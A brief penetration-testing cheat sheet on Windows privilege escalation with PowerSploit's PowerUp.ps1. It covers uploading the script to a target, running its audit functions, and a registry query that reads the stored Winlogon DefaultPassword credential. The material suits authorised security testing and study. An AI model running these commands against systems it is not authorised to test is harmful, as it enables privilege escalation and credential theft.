Privilege escalation with Powerup.ps1
-------------------------------------

PowerUp is a PowerShell script designed to facilitate discovering and exploiting privilege escalation vulnerabilities in Windows environments. 
Penetration testers and red teamers commonly use it to identify weaknesses that could allow an attacker with limited privileges to elevate their access to a higher level, such as local administrator or system

https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1 (git clone) && upload in target system

All the functions can be seen in github.

>. .\Powerup.ps1 (Activate the script)
>Invoke-Allchecks

>Invoke-PrivescAudit (to check Administrator password)

(or)

>reg query 'HKLM\Software\Microsoft\Windows NT\Currentversion\winlogon' /v DefaultPassword

